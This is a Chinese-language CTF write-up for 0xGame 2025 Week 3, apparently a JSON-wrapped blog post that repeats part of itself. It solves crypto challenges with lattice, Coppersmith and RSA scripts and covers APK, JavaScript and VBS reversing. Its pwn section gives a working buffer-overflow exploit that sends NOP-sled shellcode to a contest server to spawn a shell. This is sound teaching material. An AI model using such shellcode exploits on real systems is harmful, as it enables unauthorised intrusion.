flag:\n            print(\"Found flag:\", flag)\n            break\n```\n\nLLL 格基规约算法，得到`0xGame{8dc1f4b8-3f4e-4c3e-9d1a-2b5e6f7a8b9c}`\n\n## Copper\n\n```python\nn = 92873040755425037862453595432032305849700597051458113741962060511759338242511707376645887864988028778023918585157853023538298808432423892753226386473625357887471318145132753202886684219309732628049959875215531475307942392884965913932053771541589293948849554008069165822411930991003624635227296915315188938427\ngift = 10911712225716809560802315710689854621004330184657267444255298781464639032414821020145885934381310240257843204972266622870698161556175406337237650652528640\n\npbits = 512\nkbits = 242\n\n# 直接使用标准已知高位分解方法\ndef factor_with_high_bits(n, high, unknown_bits, p_total_bits=512):\n    from sage.all import Zmod, PolynomialRing\n    PR.<x> = PolynomialRing(Zmod(n))\n    f = high + x\n    # 尝试不同的 beta 值\n    for beta in [0.48, 0.45, 0.42, 0.4, 0.38, 0.35]:\n        for epsilon in [0.01, 0.03, 0.05, 0.08, 0.1]:\n            roots = f.small_roots(X=2^unknown_bits, beta=beta, epsilon=epsilon)\n            if roots:\n                return roots[0]\n    return None\n\nx0 = factor_with_high_bits(n, gift, kbits)\nif x0 is not None:\n    p = gift + int(x0)\n    if n % p == 0:\n        q = n // p\n        print(\"成功分解!\")\n        print(f\"p = {p}\")\n        print(f\"q = {q}\")\n        \n        # 解密\n        e = 65537\n        c = 78798946231057858237017891544035026520248922588969396262361286907576401467816384819451190528802344534495780520382462432888103466971743435370588783181267466189564132373143717299869053172848786781320750631382630113459268771330862538801774075395201914653025347332312015985213462835680853607187971669296490439714\n        \n        phi = (p-1) * (q-1)\n        d = pow(e, -1, phi)\n        m = pow(c, d, n)\n        from Crypto.Util.number import long_to_bytes\n        flag = long_to_bytes(int(m))\n        print(f\"Flag: {flag}\")\n    else:\n        print(\"p 不整除 n\")\nelse:\n    print(\"没有找到解\")\n```\n\nCoppersmith是一种用来求解多项式方程小根的方法.\n\n在`sagemath`里运行上面的脚本，得到flag：`0xGame{C0pp3r_4nd_mu1t1pl3_pr0gr3ss1ng!!!}`\n\n## LLL\n\n1. **构造格 (Lattice)**：我们将从 output.txt 文件中读出的矩阵的行向量作为格的一组基。\n2. **运行 LLL 算法**：对这组基进行 LLL 规约，算法会找到一组新的基，其中包含一些非常短的向量。\n3. **寻找 Flag**：我们要找的 flag 向量就隐藏在这些短向量中。由于矩阵乘法的影响，找到的短向量可能是原始 flag 向量的某个整数倍（例如 k * flag）。\n4. **恢复 Flag**：\n   - 我们遍历规约后基里的每一个短向量。\n   - 计算向量中所有元素的最大公约数（GCD），这个 GCD 可能就是 k。\n   - 将整个向量除以 k（或 -k），得到候选的 flag 向量。\n   - 检查候选向量的每个元素是否都在有效的 ASCII 范围内，并尝试将其转换为字符串。\n   - 验证字符串是否符合 0xGame{...} 的格式。\n\n注意本题的.txt中的矩阵需要先进行**转置**，再LLL规约。\n\n```python\nimport ast\nimport math\nfrom fpylll import IntegerMatrix, LLL\n\ndef solve():\n    \"\"\"\n    主解决函数，读取矩阵，运行 LLL 算法并寻找 Flag。\n    \"\"\"\n    # 1. 解析 output.txt 文件\n    try:\n        with open('output.txt', 'r') as f:\n            content = f.read()\n        \n        # 使用 ast.literal_eval 安全地将文件内容（字符串形式的列表）转换为 Python 对象\n        matrix_C = ast.literal_eval(content)\n\n        # 确保我们得到的是一个矩阵（列表的列表）\n        if not isinstance(matrix_C, list) or not all(isinstance(row, list) for row in matrix_C):\n            raise ValueError(\"文件内容不是一个有效的矩阵（列表的列表）\")\n\n    except Exception as e:\n        print(f\"[-] 读取或解析 output.txt 时出错: {e}\")\n        print(\"[-] 请确保 output.txt 与脚本在同一目录，且内容为有效的矩阵格式，例如 [[1, 2], [3, 4]]。\")\n        return\n\n    # --- 第一次尝试：直接使用原始矩阵的行向量作为基 ---\n    print(\"--- 尝试 1: 使用原始矩阵 C 的行向量 ---\")\n    found_flag = find_flag_in_basis(matrix_C)\n    if found_flag:\n        print(f\"\\n[+] 成功找到 Flag: {found_flag}\")\n        return\n\n    print(\"\\n[-] 在原始矩阵的基中未找到 Flag。\")\n    print(\"-\" * 50)\n\n    # --- 第二次尝试：根据提示，使用转置矩阵的行向量作为基 ---\n    print(\"--- 尝试 2: 使用转置矩阵 C^T 的行向量 ---\")\n    try:\n        rows = len(matrix_C)\n        if rows == 0:\n            print(\"[-] 矩阵为空。\")\n            return\n        cols = len(matrix_C[0])\n        \n        # 计算转置矩阵\n        transposed_C = [[matrix_C[j][i] for j in range(rows)] for i in range(cols)]\n        \n        found_flag = find_flag_in_basis(transposed_C)\n        if found_flag:\n            print(f\"\\n[+] 成功找到 Flag: {found_flag}\")\n            return\n    except Exception as e:\n        print(f\"[-] 在进行第二次尝试时出错: {e}\")\n\n    print(\"\\n[-] 在转置矩阵的基中也未找到 Flag。\")\n    print(\"\\n[!] 解密失败。正如提示所说，可能需要构建一个更复杂的格结构。\")\n\ndef find_flag_in_basis(basis_matrix):\n    \"\"\"\n    对给定的基矩阵进行 LLL 规约，并从中寻找 Flag。\n\n    Args:\n        basis_matrix (list of lists): 作为格的基的矩阵。\n\n    Returns:\n        str: 如果找到 Flag，则返回 Flag 字符串，否则返回 None。\n    \"\"\"\n    try:\n        # 2. 构造格的基\n        n = len(basis_matrix)\n        B = IntegerMatrix.from_matrix(basis_matrix)\n\n        # 3. 运行 LLL 算法进行规约\n        print(f\"[*] 正在对一个 {n}x{n} 的矩阵进行 LLL 规约...\")\n        B_reduced = LLL.reduction(B)\n        print(\"[*] LLL 规约完成。\")\n\n        # 4. 分析规约后的基向量\n        print(\"[*] 正在分析规约后的短向量...\")\n        for i in range(n):\n            # 获取一个规约后的向量 v\n            v = list(B_reduced[i])\n            \n            # 5. 尝试从向量 v 中恢复 Flag\n            # 向量 v 可能是 flag 向量的整数倍 k*f。通过计算最大公约数（GCD）来找到 k。\n            non_zero_elements = [abs(x) for x in v if x != 0]\n            if not non_zero_elements:\n                continue  # 跳过零向量\n            \n            # 计算所有非零元素的 GCD\n            common_divisor = non_zero_elements[0]\n            for j in range(1, len(non_zero_elements)):\n                common_divisor = math.gcd(common_divisor, non_zero_elements[j])\n\n            # LLL 找到的向量方向可能相反，所以要同时尝试 k 和 -k\n            for sign in [1, -1]:\n                k = common_divisor * sign\n                try:\n                    # 用向量 v 除以 k，得到 flag 候选\n                    f_candidate = [x // k for x in v]\n                    \n                    # 检查候选向量的所有元素是否都在0-127的 ASCII 范围内\n                    is_ascii = all(0 < x < 128 for x in f_candidate)\n                    if is_ascii:\n                        flag_str = \"\".join(map(chr, f_candidate))\n                        # 检查是否符合已知的 flag 格式\n                        if flag_str.startswith(\"0xGame{\") and flag_str.endswith(\"}\"):\n                            return flag_str\n                except (ZeroDivisionError, TypeError):\n                    continue\n    \n    except ImportError:\n        print(\"\\n[-] 错误：未找到 fpylll 库。\")\n        print(\"[-] 请使用 'pip install fpylll' 命令进行安装。\")\n        # Exit the whole script if the library is missing\n        exit(1)\n    except Exception as e:\n        print(f\"\\n[-] 在 LLL 规约或分析过程中发生错误: {e}\")\n        \n    return None\n\nif __name__ == '__main__':\n    solve()\n```\n\n得到flag：`0xGame{B3g1nn3r_t0_1e4rn_L4tt1c3s}`\n\n## RSA\n\n```python\n#!/usr/bin/env sage\n# -*- coding: utf-8 -*-\n\nfrom pwn import remote\nfrom pwn import log as pwnlog\nfrom sage.all import *\n\ndef solve():\n    io = remote('nc1.ctfplus.cn', 34782)\n    pwnlog.info(\"Connection established. Timer has started. Executing...\")\n\n    # --- 1. 快速解析服务器输出 ---\n    io.recvuntil(b'Coordinate of P is (')\n    p1_str = io.recvuntil(b')', drop=True).replace(b'\\n', b'')\n    px1, py1 = map(int, p1_str.split(b','))\n    io.recvuntil(b'Coordinate of P is (')\n    p2_str = io.recvuntil(b')', drop=True).replace(b'\\n', b'')\n    px2, py2 = map(int, p2_str.split(b','))\n    io.recvuntil(b'n = ')\n    n_str = io.recvuntil(b'\\n[-]', drop=True).replace(b'\\n', b'')\n    n = int(n_str)\n    e = 65537\n    pwnlog.success(\"Data parsed.\")\n\n    # --- 2. 快速分解 n ---\n    pwnlog.info(\"Factoring n...\")\n    A1 = (pow(py1, 2, n) - pow(px1, 3, n)) % n\n    A2 = (pow(py2, 2, n) - pow(px2, 3, n)) % n\n    delta_A = (A1 - A2) % n\n    f1 = gcd(delta_A, n)\n    f2 = n // f1\n    pwnlog.success(\"n factored into two factors.\")\n\n    # --- 3. 根据超奇异条件确定 p 和 q ---\n    pwnlog.info(\"Identifying p and q based on supersingular conditions...\")\n    p, q = None, None\n    if f1 % 3 == 2 and f2 % 4 == 3:\n        p, q = f1, f2\n        pwnlog.success(\"Assignment found: p = factor1 (p%3=2), q = factor2 (q%4=3).\")\n    elif f2 % 3 == 2 and f1 % 4 == 3:\n        p, q = f2, f1\n        pwnlog.success(\"Assignment found: p = factor2 (p%3=2), q = factor1 (q%4=3).\")\n    else:\n        pwnlog.failure(\"Factors do not meet the expected supersingular conditions. Attack failed.\")\n        io.close()\n        return\n\n    # --- 4. 瞬时计算阶和求解 ---\n    pwnlog.info(\"Calculating orders and solving discrete logs...\")\n    # 阶的计算现在是 O(1)\n    Np = p + 1\n    Nq = q + 1\n    \n    # 在 GF(p) 上求解\n    Fp = GF(p)\n    Ep = EllipticCurve(Fp, [0, q])\n    dp = inverse_mod(e, Np)\n    P1_p = Ep(px1, py1)\n    Q1_p = dp * P1_p\n    x_mod_p = Q1_p[0]\n    \n    # 在 GF(q) 上求解\n    Fq = GF(q)\n    Eq = EllipticCurve(Fq, [p, 0])\n    dq = inverse_mod(e, Nq)\n    P1_q = Eq(px1, py1)\n    Q1_q = dq * P1_q\n    x_mod_q = Q1_q[0]\n\n    # --- 5. 合并结果并立即发送 ---\n    pwnlog.info(\"Combining results with CRT and sending secret...\")\n    x = crt([Integer(x_mod_p), Integer(x_mod_q)], [p, q])\n    secret_bytes = x.to_bytes(126, 'big')[:35]\n    secret_hex = secret_bytes.hex()\n    pwnlog.success(f\"Secret recovered (hex): {secret_hex}\")\n\n    io.sendlineafter(b'[-] Give me the secret:', secret_hex.encode())\n    \n    flag = io.recvall().decode(errors='ignore')\n    pwnlog.success(\"Received response:\\n\" + flag)\n    io.close()\n\nif __name__ == \"__main__\":\n    solve()\n```\n\n由于题目有时间限制，所以按常规对素数的解法会超时，所以我们取素数是超奇异数这一特殊情况，能够加快运算，并能够及时通过pwn把计算出的secret发送给服务器，实现交互，得到flag。\n\n但其实实际上容器生成的随机素数并不全是超奇异数，所以实际需要多运行几次，若容器返回的刚好是超奇异数，就能打通了。\n\nflag：` 0xGame{cab11ca1-2615-4353-8bdc-83acfbc158d9}`\n\n## 变化的公钥\n\n```python\nimport math\nfrom Crypto.Util.number import long_to_bytes\nimport gmpy2\n\n# ========= 您提供的数据 =========\nc_flag = 3768551934826292593833035309611313515410350948177015252689101612760092214724819460968940593137063674343550213845565985577708096326384804161039234286824257\np = 92183828593120412163104340291760641288180588598799559753245539989169201953287\nq = 112341696090923376544622587134650063030670067695398128869588369062187162349067\n\n# 手动交互得到的加密数据 {明文: 密文}\nencrypted_data = {\n    2: 8661456987622729713284875140324390021854656336220032548752643276741012650814412956153724560835436673697707915353315705759467237138561861755697546499239404,\n    3: 4517771087385690059400613106400236028797989648570504435335842458967594563252372288742748213792858933900161922306165687720613665857113406491341498148219072,\n    4: 4461368238758747164492118791058784945853565508910915006788491998225437417465209099602788188410713446842464672424069396400510956103768639651291936269944409,\n    5: 252593148397960384672099236062132976194716239214893311677001562315947306045440602988806836496469883640979695884101793958904581043170908588967763161253161,\n    # ... 您可以根据需要添加更多数据\n}\n\n# ========= 工具函数 (无变动) =========\ndef get_prime_factors(n, limit=1000000):\n    factors = {}\n    d = 2\n    temp_n = n\n    while d * d <= temp_n:\n        if d > limit: break\n        while temp_n % d == 0:\n            factors[d] = factors.get(d, 0) + 1\n            temp_n //= d\n        d += 1\n    if temp_n > 1 and temp_n <= limit:\n        factors[temp_n] = factors.get(temp_n, 0) + 1\n    return sorted(factors.keys())\n\ndef extended_gcd(a, b):\n    if a == 0: return b, 0, 1\n    d, x1, y1 = extended_gcd(b % a, a)\n    x = y1 - (b // a) * x1\n    y = x1\n    return d, x, y\n\ndef chinese_remainder_theorem(congruences):\n    M = 1\n    for _, n_i in congruences: M *= n_i\n    result = 0\n    for a_i, n_i in congruences:\n        M_i = M // n_i\n        _, N_i, _ = extended_gcd(M_i, n_i)\n        result = (result + a_i * M_i * N_i) % M\n    return result\n\n# ========= 离线解密主逻辑 =========\ndef solve_offline():\n    n = p * q\n    phi_n = (p - 1) * (q - 1)\n\n    print(f\"[+] n: {str(n)[:30]}...\")\n    print(f\"[+] phi(n): {str(phi_n)[:30]}...\")\n    \n    factors = get_prime_factors(phi_n, limit=1000000)\n    print(f\"[+] Found {len(factors)} small prime factors of phi(n) up to 1,000,000.\")\n\n    congruences = []\n    moduli_product = 1\n    E_UPPER_BOUND = 2**300\n\n    for p_i in factors:\n        print(f\"\\n[*] Trying to find e mod {p_i}\")\n\n        # 寻找合适的基 m\n        base_m = -1\n        for m in sorted(encrypted_data.keys()):\n            # 检查这个基 m 是否能用\n            if pow(m, phi_n // p_i, n) != 1:\n                base_m = m\n                break\n        \n        if base_m == -1:\n            print(f\"    - Could not find a suitable base in provided data for p_i = {p_i}. Skipping.\")\n            continue\n        \n        print(f\"    - Using base m = {base_m} from provided data.\")\n        \n        m_prime = pow(base_m, phi_n // p_i, n)\n        c_m = encrypted_data[base_m]\n        c_prime = pow(c_m, phi_n // p_i, n)\n        \n        found_x = -1\n        for x in range(p_i):\n            if pow(m_prime, x, n) == c_prime:\n                found_x = x\n                break\n        \n        if found_x != -1:\n            print(f\"    - Solved! e \\u2261 {found_x} (mod {p_i})\")\n            congruences.append((found_x, p_i))\n            moduli_product *= p_i\n        else:\n            print(f\"    - Failed to solve for e mod {p_i}.\")\n        \n        if moduli_product > E_UPPER_BOUND:\n            print(\"\\n[+] Collected enough congruences to determine e.\")\n            break\n            \n    if moduli_product <= E_UPPER_BOUND:\n        print(\"\\n[-] Could not find enough small prime factors to determine e. The attack failed.\")\n        return\n\n    print(\"\\n[*] Solving for e using Chinese Remainder Theorem...\")\n    e = chinese_remainder_theorem(congruences)\n    print(f\"[+] Found e: {e}\")\n\n    if gmpy2.is_prime(e):\n        print(\"[+] Verification successful: e is a prime number.\")\n    else:\n        print(\"[!] Warning: Calculated e is not a prime number.\")\n\n    print(\"\\n[*] Calculating private key d and decrypting the flag...\")\n    d = pow(e, -1, phi_n)\n    flag_val = pow(c_flag, d, n)\n    \n    try:\n        flag = long_to_bytes(flag_val)\n        print(\"\\n\" + \"=\"*50)\n        print(f\"[*] DECRYPTED FLAG: {flag.decode()}\")\n        print(\"=\"*50)\n    except Exception as err:\n        print(f\"\\n[-] Failed to decode the flag: {err}\")\n        print(f\"[*] Decrypted integer value: {flag_val}\")\n\nif __name__ == '__main__':\n    solve_offline()\n```\n\n类似Pohlig-Hellman攻击，在这个子群里解DLP，解出很多模数互质的解后就可以解原题了，通过很多个加密过的数来逆向还原加密过程，求解e，p，q，从而解出flag：`0xGame{69d14068-30b4-41df-a17b-de434c3bc7b8}`\n\n# pwn\n\n## ret2shellcode\n\n```python\nimport pwn\npwn.context.arch = 'amd64'\np = pwn.remote('nc1.ctfplus.cn',36618)\np.recvuntil(b\"time\")\n\nshellcode = pwn.asm(pwn.shellcraft.sh())\n\n# payload: 填充 + NOP滑梯 + Shellcode\npayload = b'a'*80 + b'\\x90' *80 + shellcode\n\np.send(payload)\np.interactive()\n```\n\n**pwn.shellcraft 会根据 context 自动生成对应的 shellcode**\n\n- `pwn.shellcraft.sh()`用pwn里的shellcraft板子sh()生成执行`execve(\"/bin/sh\", NULL, NULL)`得到shell的汇编\n- 然后使用`pwn.asm()`函数将汇编指令转换成二进制机器码（字节流），这样子发送过去才能被识别。\n- 最重要的是`NOP`空指令滑梯，由于程序在80-159之间跳转的偏移是不确定的，若将shellcode放在这个区域,会导致程序不能从第一条shellcode指令开始正确的执行，所以我们可以使用NOP指令（机器码0x90，填充为\\x90），`b'\\x90'*80`,b' '表示以字节流发送，用`\\x90`(空指令)填充完这个不确定的区域，让程序就像在一个“滑梯”上向下滑行，直到滑出这个区域，执行我们紧跟在后面的真实 shellcode。\n\n得到flag：`0xGame{Not_only_nop_can_jmp_controlstream}`\n\n# Re\n\n## apk逆向\n\n`_4nd_dex_loader}`:\n\n```python\n# 导入z3库\nfrom z3 import *\n\n# 1. 定义变量\n# 每个变量是16个十六进制字符，即 64 位\nv0, v1, v2 = BitVecs('v0 v1 v2', 64)\n\n# 2. 创建求解器实例\ns = Solver()\n\n# 3. 添加数学方程约束\ns.add(v1 + v0 * 3 == 27454419028250566601)\ns.add(v2 * 2 - v1 * 5 + 20616666104378640363 == 0)\ns.add(v0 + v2 * 4 == 0x1dce62be9f0fa2f6c)\n\n# 4. 添加结构性约束\n# v1 由 v0 的低32位 (Extract(31, 0, v0)) 和 v2 的高32位 (Extract(63, 32, v2)) 组成\ns.add(v1 == Concat(Extract(31, 0, v0), Extract(63, 32, v2)))\n\n# 5. 检查解是否存在并输出\nif s.check() == sat:\n    m = s.model()\n    # 提取v0和v2的值\n    val_v0 = m[v0].as_long()\n    val_v2 = m[v2].as_long()\n\n    # 将v0和v2的值格式化为16位的十六进制字符串\n    hex_v0 = format(val_v0, '016x')\n    hex_v2 = format(val_v2, '016x')\n    \n    # 最终的输入字符串 str 是 v0 和 v2 的拼接\n    flag_hex = hex_v0 + hex_v2\n    \n    print(f\"求解成功!\")\n    print(f\"v0 = 0x{hex_v0}\")\n    print(f\"v2 = 0x{hex_v2}\")\n    print(f\"拼接后的Hex字符串: {flag_hex}\")\n    \n    # 将十六进制字符串转换为ASCII字符\n    try:\n        flag_ascii = bytes.fromhex(flag_hex).decode('utf-8')\n        print(f\"ASCII结果: {flag_ascii}\")\n    except Exception as e:\n        print(f\"转换为ASCII失败: {e}\")\n\nelse:\n    print(\"求解失败，方程无解。\")\n```\n\n资源文件-->Assets-->dex.zip,**.zip文件一般是不会出现在这里的**，所以flag的关键应该就放在这里面，导出这个dex.zip文件，解压缩，010打开查看文件头，是**64 65 78 0A**，所以这个其实并不是zip，而是一个dex文件，更改文件名为dex.dex，用jadx打开，就能看到反编译的源码了，用z3解方程组，得到后半段`_4nd_dex_loader}`\n\n`0xGame{Do_y0u_l0v3_andr01d`:\n\n前半段在源代码-->com-->example.easyapp-->MainActivity-->onCreate$lambda$方法中找到base64编码过的flag：`MHhHYW1le0RvX3kwdV9sMHYzX2FuZHIwMWQ=`\n\n解码得到`0xGame{Do_y0u_l0v3_andr01d`\n\n拼接flag得到：`0xGame{Do_y0u_l0v3_andr01d_4nd_dex_loader}`\n\n**一般都在源代码-->com-->MainActivity里面**\n\n## 扫雷\n\n分析`.js`文件，可以看到触发给flag的逻辑，当难度为expert时玩家胜利会触发`_0x20eae2`这个函数，函数内部调用了`_0x172ca4`函数，这里包含了解密flag的逻辑--**重复密钥异或**(XOR)，密钥key--`WebIsInteresting`和flag密文`g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P}^}\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e`，\n\n逆向解密：\n\n```python\nencrypted_data = b\"g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P}^}\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e\"\nkey = b\"WebIsInteresting\"\ndecrypted_data = bytearray()\n\nfor i in range(len(encrypted_data)):\n  decrypted_data.append(encrypted_data[i] ^ key[i % len(key)])\n\nflag = decrypted_data.decode()\nprint(flag)\n```\n\n得到flag：`0xGame{463950f9-9824-4bfb-8230-98ab02d431d0}`\n\n## VBS\n\n把`Execute`改为`wscript.echo`，然后在终端输入`cscript.exe 1.vbs`就能得到源代码输出到终端，\n\n- `wscript.exe 1.vbs`   输出到一个程序窗口，不方便复制，\n- `cscript.exe 1.vbs`    输出到终端，更方便复制。\n\n可以观察到源码分两段，中间有`Execute Code`分隔，修改原.vbs，最后一行加上`Wscripts.Echo`，就能看到去了第二层混淆的源码，\n\n但是再观察一下，后面还是好几行的乱码，于是再进行`Execute`到`Wscript.Echo`的转换，三层混淆，我没招了😭😭\n\n三层混淆解完之后，就能看到base64编码表`fx6LUY5at9lnwmd3TbqzuRy+AipWHPDoXZKMFGCV2I/QjSreEsh18NJkg0v74OcB`和flag密文`waZaAyNGDJ9CwLfNdzYCnyUsAJtSmLU0wqNKmLYFnyT8iyRMi5UEAMH0da8=`，放到cyberchef里解一下密，得到flag：`0xGame{bf00591f-a1cb-4191-b41d-d4eecda0b798}`\n\n","source":"_posts/0xGame2025Week3WP.md","raw":"---\ntitle: 0xGame Week3 WP\ndate: 2025-11-07\ncategories: pwn\ntop_img: \ncover: \n---\n\n\n\n# Crypto\n\n## Ez_LLL\n\n```python\nfrom Crypto.Util.number import long_to_bytes\n\np = 151240196317566398919874094060690044886978001146739221635377812709640347441550250665168046149125216617951660209690860015625296899030453965800801283336223544189902980591153121592938172963303968803995733283426759581586368403208379337416298836517168491618212440911971420911495272791409112867645195821357346746831\nh = 124332746104765845147133491132959579184849644379099440465281812273660434050281263409975356196112560300248343107170084466976976410232928660489912629913525776979726428263975968343564076005019264661696777686114079504603568726429498116488469855127100166072195548037981863885014261706582936943023968781022607949646\n\n# Build lattice\nM = matrix(ZZ, [\n    [1, h],\n    [0, p]\n])\n\n# LLL reduction\nL = M.LLL()\n\nfor row in L:\n    f_candidate = abs(row[0])\n    g_candidate = abs(row[1])\n    # Check if g_candidate is 350-bit prime\n    if g_candidate.nbits() == 350 and is_prime(g_candidate):\n        flag = long_to_bytes(f_candidate)\n        if b'0xGame' in flag:\n            print(\"Found flag:\", flag)\n            break\n```\n\nLLL 格基规约算法，得到`0xGame{8dc1f4b8-3f4e-4c3e-9d1a-2b5e6f7a8b9c}`\n\n## Copper\n\n```python\nn = 92873040755425037862453595432032305849700597051458113741962060511759338242511707376645887864988028778023918585157853023538298808432423892753226386473625357887471318145132753202886684219309732628049959875215531475307942392884965913932053771541589293948849554008069165822411930991003624635227296915315188938427\ngift = 10911712225716809560802315710689854621004330184657267444255298781464639032414821020145885934381310240257843204972266622870698161556175406337237650652528640\n\npbits = 512\nkbits = 242\n\n# 直接使用标准已知高位分解方法\ndef factor_with_high_bits(n, high, unknown_bits, p_total_bits=512):\n    from sage.all import Zmod, PolynomialRing\n    PR.<x> = PolynomialRing(Zmod(n))\n    f = high + x\n    # 尝试不同的 beta 值\n    for beta in [0.48, 0.45, 0.42, 0.4, 0.38, 0.35]:\n        for epsilon in [0.01, 0.03, 0.05, 0.08, 0.1]:\n            roots = f.small_roots(X=2^unknown_bits, beta=beta, epsilon=epsilon)\n            if roots:\n                return roots[0]\n    return None\n\nx0 = factor_with_high_bits(n, gift, kbits)\nif x0 is not None:\n    p = gift + int(x0)\n    if n % p == 0:\n        q = n // p\n        print(\"成功分解!\")\n        print(f\"p = {p}\")\n        print(f\"q = {q}\")\n        \n        # 解密\n        e = 65537\n        c = 78798946231057858237017891544035026520248922588969396262361286907576401467816384819451190528802344534495780520382462432888103466971743435370588783181267466189564132373143717299869053172848786781320750631382630113459268771330862538801774075395201914653025347332312015985213462835680853607187971669296490439714\n        \n        phi = (p-1) * (q-1)\n        d = pow(e, -1, phi)\n        m = pow(c, d, n)\n        from Crypto.Util.number import long_to_bytes\n        flag = long_to_bytes(int(m))\n        print(f\"Flag: {flag}\")\n    else:\n        print(\"p 不整除 n\")\nelse:\n    print(\"没有找到解\")\n```\n\nCoppersmith是一种用来求解多项式方程小根的方法.\n\n在`sagemath`里运行上面的脚本，得到flag：`0xGame{C0pp3r_4nd_mu1t1pl3_pr0gr3ss1ng!!!}`\n\n## LLL\n\n1. **构造格 (Lattice)**：我们将从 output.txt 文件中读出的矩阵的行向量作为格的一组基。\n2. **运行 LLL 算法**：对这组基进行 LLL 规约，算法会找到一组新的基，其中包含一些非常短的向量。\n3. **寻找 Flag**：我们要找的 flag 向量就隐藏在这些短向量中。由于矩阵乘法的影响，找到的短向量可能是原始 flag 向量的某个整数倍（例如 k * flag）。\n4. **恢复 Flag**：\n   - 我们遍历规约后基里的每一个短向量。\n   - 计算向量中所有元素的最大公约数（GCD），这个 GCD 可能就是 k。\n   - 将整个向量除以 k（或 -k），得到候选的 flag 向量。\n   - 检查候选向量的每个元素是否都在有效的 ASCII 范围内，并尝试将其转换为字符串。\n   - 验证字符串是否符合 0xGame{...} 的格式。\n\n注意本题的.txt中的矩阵需要先进行**转置**，再LLL规约。\n\n```python\nimport ast\nimport math\nfrom fpylll import IntegerMatrix, LLL\n\ndef solve():\n    \"\"\"\n    主解决函数，读取矩阵，运行 LLL 算法并寻找 Flag。\n    \"\"\"\n    # 1. 解析 output.txt 文件\n    try:\n        with open('output.txt', 'r') as f:\n            content = f.read()\n        \n        # 使用 ast.literal_eval 安全地将文件内容（字符串形式的列表）转换为 Python 对象\n        matrix_C = ast.literal_eval(content)\n\n        # 确保我们得到的是一个矩阵（列表的列表）\n        if not isinstance(matrix_C, list) or not all(isinstance(row, list) for row in matrix_C):\n            raise ValueError(\"文件内容不是一个有效的矩阵（列表的列表）\")\n\n    except Exception as e:\n        print(f\"[-] 读取或解析 output.txt 时出错: {e}\")\n        print(\"[-] 请确保 output.txt 与脚本在同一目录，且内容为有效的矩阵格式，例如 [[1, 2], [3, 4]]。\")\n        return\n\n    # --- 第一次尝试：直接使用原始矩阵的行向量作为基 ---\n    print(\"--- 尝试 1: 使用原始矩阵 C 的行向量 ---\")\n    found_flag = find_flag_in_basis(matrix_C)\n    if found_flag:\n        print(f\"\\n[+] 成功找到 Flag: {found_flag}\")\n        return\n\n    print(\"\\n[-] 在原始矩阵的基中未找到 Flag。\")\n    print(\"-\" * 50)\n\n    # --- 第二次尝试：根据提示，使用转置矩阵的行向量作为基 ---\n    print(\"--- 尝试 2: 使用转置矩阵 C^T 的行向量 ---\")\n    try:\n        rows = len(matrix_C)\n        if rows == 0:\n            print(\"[-] 矩阵为空。\")\n            return\n        cols = len(matrix_C[0])\n        \n        # 计算转置矩阵\n        transposed_C = [[matrix_C[j][i] for j in range(rows)] for i in range(cols)]\n        \n        found_flag = find_flag_in_basis(transposed_C)\n        if found_flag:\n            print(f\"\\n[+] 成功找到 Flag: {found_flag}\")\n            return\n    except Exception as e:\n        print(f\"[-] 在进行第二次尝试时出错: {e}\")\n\n    print(\"\\n[-] 在转置矩阵的基中也未找到 Flag。\")\n    print(\"\\n[!] 解密失败。正如提示所说，可能需要构建一个更复杂的格结构。\")\n\ndef find_flag_in_basis(basis_matrix):\n    \"\"\"\n    对给定的基矩阵进行 LLL 规约，并从中寻找 Flag。\n\n    Args:\n        basis_matrix (list of lists): 作为格的基的矩阵。\n\n    Returns:\n        str: 如果找到 Flag，则返回 Flag 字符串，否则返回 None。\n    \"\"\"\n    try:\n        # 2. 构造格的基\n        n = len(basis_matrix)\n        B = IntegerMatrix.from_matrix(basis_matrix)\n\n        # 3. 运行 LLL 算法进行规约\n        print(f\"[*] 正在对一个 {n}x{n} 的矩阵进行 LLL 规约...\")\n        B_reduced = LLL.reduction(B)\n        print(\"[*] LLL 规约完成。\")\n\n        # 4. 分析规约后的基向量\n        print(\"[*] 正在分析规约后的短向量...\")\n        for i in range(n):\n            # 获取一个规约后的向量 v\n            v = list(B_reduced[i])\n            \n            # 5. 尝试从向量 v 中恢复 Flag\n            # 向量 v 可能是 flag 向量的整数倍 k*f。通过计算最大公约数（GCD）来找到 k。\n            non_zero_elements = [abs(x) for x in v if x != 0]\n            if not non_zero_elements:\n                continue  # 跳过零向量\n            \n            # 计算所有非零元素的 GCD\n            common_divisor = non_zero_elements[0]\n            for j in range(1, len(non_zero_elements)):\n                common_divisor = math.gcd(common_divisor, non_zero_elements[j])\n\n            # LLL 找到的向量方向可能相反，所以要同时尝试 k 和 -k\n            for sign in [1, -1]:\n                k = common_divisor * sign\n                try:\n                    # 用向量 v 除以 k，得到 flag 候选\n                    f_candidate = [x // k for x in v]\n                    \n                    # 检查候选向量的所有元素是否都在0-127的 ASCII 范围内\n                    is_ascii = all(0 < x < 128 for x in f_candidate)\n                    if is_ascii:\n                        flag_str = \"\".join(map(chr, f_candidate))\n                        # 检查是否符合已知的 flag 格式\n                        if flag_str.startswith(\"0xGame{\") and flag_str.endswith(\"}\"):\n                            return flag_str\n                except (ZeroDivisionError, TypeError):\n                    continue\n    \n    except ImportError:\n        print(\"\\n[-] 错误：未找到 fpylll 库。\")\n        print(\"[-] 请使用 'pip install fpylll' 命令进行安装。\")\n        # Exit the whole script if the library is missing\n        exit(1)\n    except Exception as e:\n        print(f\"\\n[-] 在 LLL 规约或分析过程中发生错误: {e}\")\n        \n    return None\n\nif __name__ == '__main__':\n    solve()\n```\n\n得到flag：`0xGame{B3g1nn3r_t0_1e4rn_L4tt1c3s}`\n\n## RSA\n\n```python\n#!/usr/bin/env sage\n# -*- coding: utf-8 -*-\n\nfrom pwn import remote\nfrom pwn import log as pwnlog\nfrom sage.all import *\n\ndef solve():\n    io = remote('nc1.ctfplus.cn', 34782)\n    pwnlog.info(\"Connection established. Timer has started. Executing...\")\n\n    # --- 1. 快速解析服务器输出 ---\n    io.recvuntil(b'Coordinate of P is (')\n    p1_str = io.recvuntil(b')', drop=True).replace(b'\\n', b'')\n    px1, py1 = map(int, p1_str.split(b','))\n    io.recvuntil(b'Coordinate of P is (')\n    p2_str = io.recvuntil(b')', drop=True).replace(b'\\n', b'')\n    px2, py2 = map(int, p2_str.split(b','))\n    io.recvuntil(b'n = ')\n    n_str = 